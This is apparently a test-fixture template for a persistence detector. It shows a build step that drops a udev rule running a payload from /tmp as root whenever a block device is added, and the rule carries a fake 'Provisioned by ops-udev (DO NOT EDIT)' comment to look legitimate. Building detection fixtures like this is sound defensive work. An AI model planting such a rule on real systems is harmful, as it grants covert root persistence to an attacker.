# Implant template: udev-run-tmp (L3, orphan)
#
# T1546 (Event Triggered Execution). Drops a udev rule whose RUN+=
# directive executes a payload under /tmp on a device event (e.g. block
# device add), giving root-context re-execution. The udev module fires
# udev_run_directive plus interpreter_in_tmp / exec_target_orphan on the
# /tmp target.
#
# Variables: ${rules_file}, ${payload}

RUN mkdir -p /etc/udev/rules.d && \
    printf '%s\n' \
        '# Provisioned by ops-udev (DO NOT EDIT)' \
        'ACTION=="add", SUBSYSTEM=="block", RUN+="${payload}"' \
        > ${rules_file} && \
    chown root:root ${rules_file} && \
    chmod 0644 ${rules_file}
